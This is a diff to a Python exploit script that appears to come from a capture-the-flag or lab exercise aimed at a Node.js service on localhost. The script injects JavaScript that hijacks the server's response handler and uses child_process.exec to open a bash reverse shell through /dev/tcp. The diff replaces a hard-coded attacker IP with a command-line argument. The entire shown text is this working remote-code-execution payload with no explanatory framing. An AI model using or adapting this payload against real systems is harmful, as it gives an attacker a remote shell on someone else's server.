@@ -10,13 +10,16 @@ import sys
 
 url = 'http://127.0.0.1:4242/'
 
+if len(sys.argv) != 2:
+    print("please pass your IP as argument")
+
 payload = (
     "require('http').ServerResponse.prototype.end = (function (end) {" +
         "return function () {" +
             "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));" +
             "console.log('still inside');" +
             "const { exec } = require('child_process');" +
-            "exec('bash -i >& /dev/tcp/144.122.139.40/1234 0>&1', { shell: '/bin/bash' }, (error, stdout, stderr) => {" +
+            f"exec('bash -i >& /dev/tcp/{sys.argv[1]}/1234 0>&1', {{ shell: '/bin/bash' }}, (error, stdout, stderr) => {{" +
                 "if (error) {" +
                     "console.error('Exec error: ' + error);" +
                     "return;" +
